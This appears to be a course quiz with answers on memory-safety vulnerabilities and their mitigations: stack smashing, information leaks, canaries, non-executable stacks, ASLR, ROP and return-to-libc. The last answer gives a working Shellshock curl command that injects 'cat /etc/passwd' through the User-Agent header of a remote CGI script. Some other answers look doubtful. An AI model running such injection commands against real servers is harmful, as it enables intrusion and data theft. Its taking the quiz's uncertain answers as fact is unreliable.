1/10) Is the program leak.c vulnerable to a buffer overflow of type stack smashing/control hijacking?
(If yes why, if no why)
Answer: No, the program is not vulnerable to buffer overflow of type stack smashing/control hijacking because all array operations are within their respective bounds.

2/10) Is the program leak.c vulnerable to a buffer overflow of type information exfiltration?
(If yes why, if no why)
Answer: Yes, the program is vulnerable to buffer overflow of type information exfiltration because it can print uninitialized or out-of-bounds memory contents.

3/10) Is the program leak.c vulnerable if stack protectors (canaries) are in place?
(If yes why, if no why)
Answer: No, the program is not vulnerable if stack protectors (canaries) are in place because the buffer overflow of concern involves heap memory, not the stack.

4/10) Can not executable stack prevent the return loop in loop3.c?
(If yes why, if no why)
Answer: No, a non-executable stack does not prevent the return loop because the vulnerability exploits out-of-bounds writes, not stack execution.

5/10) Can stack protectors (canaries) prevent the return loop in loop3.c?
(If yes why, if no why)
Answer: No, stack protectors cannot prevent the return loop because the modification occurs beyond the bounds of the array buf but within its scope, not directly affecting the canary.

6/10) Can ASLR prevent the return loop in loop3.c?
(If yes why, if no why)
Answer: Yes, ASLR can make it difficult to predict the address of the loop function, thereby potentially preventing the return loop from correctly modifying the return address to re-enter loop.

Let's make the Hypothesis that there is no "system" function call in the libc library
7/10) Is it still possible to make a Return Oriented Programming attack?
(If yes why, if no why)
Answer: Yes, it is still possible to perform a ROP attack without the system function as long as there are enough useful gadgets in memory to perform the desired operations.

Let's make the Hypothesis that there is no "system" function call in the libc library
8/10) Is it possible to make a return to libc attack that activates any program that is present on the system?
(If yes why, if no why, are there any restrictions)
Answer: Yes, it is possible to perform a return to libc attack to activate any program present on the system by finding and using other functions in libc that allow execution of external programs, such as execve.

9/10) Does ASLR protect from a return to libc attack?
(If yes why, if no why)
Answer: Yes, ASLR provides protection from return to libc attacks by randomizing the memory addresses of libc functions, making it difficult to predict their locations.

Assume you know the address of a http server with the shellshock vulnerability and a myCommand CGI program available (in the default CGI-BIN folder).
10/10) Write the curl command that makes an http request that exploits the shellshock vulnerability and executes the "cat /etc/passwd" command redirecting the output to a file named pippo.txt in the folder /tmp on the remote server
Answer: curl -A 'User-Agent: () { :; }; echo; echo; /bin/cat /etc/passwd > /tmp/pippo.txt' http://<server-address>/cgi-bin/myCommand
